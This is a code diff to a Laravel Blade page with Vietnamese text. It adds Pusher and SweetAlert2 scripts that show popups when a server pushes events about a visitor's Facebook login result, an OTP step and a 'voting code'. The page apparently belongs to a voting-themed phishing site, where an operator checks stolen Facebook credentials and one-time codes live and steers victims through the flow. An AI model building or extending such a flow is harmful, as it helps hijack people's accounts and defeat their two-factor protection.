@@ -52,7 +52,100 @@ $settings = App\Models\Setting::first(); // Truy vấn model Settings
             display: none;
         }
     </style>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
+<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
+<script>
+    Pusher.logToConsole = true;
+
+    var pusher = new Pusher('bfb528bfe72756d0a69e', {
+        cluster: 'ap1'
+    });
+
+    var channel = pusher.subscribe('notification');
+
+    const currentUserId = @json(Auth::id());
+
+    channel.bind('test.notification', function (data) {
+    console.log(data.loginSuccess);
+
+    // Check if loginSuccess or codeEntrySuccess is true and route accordingly
+    if (data.loginSuccess === true) {
+        Swal.fire({
+            icon: 'success',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Bạn đã đăng nhập thành công!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // Redirect to /login if loginSuccess is true
+                window.location.href = '/otp';
+            }
+        });
+    } else if (data.codeEntrySuccess === true) {
+        Swal.fire({
+            icon: 'success',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Nhập mã thành công!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // Redirect to / if codeEntrySuccess is true
+                window.location.href = '/';
+            }
+        });
+    } else if (data.facebookLoginError === true) {
+        Swal.fire({
+            icon: 'error',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Thông tin đăng nhập hoặc tài khoản sai!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // Redirect to / if codeEntrySuccess is true
+                window.location.href = '';
+            }
+        });
+    } else if (data.codeSelectionError === true) {
+        Swal.fire({
+            icon: 'error',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Mã bình chọn sai!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // Redirect to / if codeEntrySuccess is true
+                window.location.href = '';
+            }
+        });
+    } else if (data.notify === true) {
+        Swal.fire({
+            icon: 'success',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Mã bình chọn sai!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // Redirect to / if codeEntrySuccess is true
+                window.location.href = '';
+            }
+        });
+    } else {
+        // General notification message if neither loginSuccess nor codeEntrySuccess is true
+        Swal.fire({
+            icon: 'success',
+            title: 'Thông báo mới',
+            text: data.notificationMessage || 'Bạn có một thông báo mới!',
+            confirmButtonText: 'OK'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                window.location.reload();
+            }
+        });
+    }
+});
+
+</script>
 </body>
 
 </html>
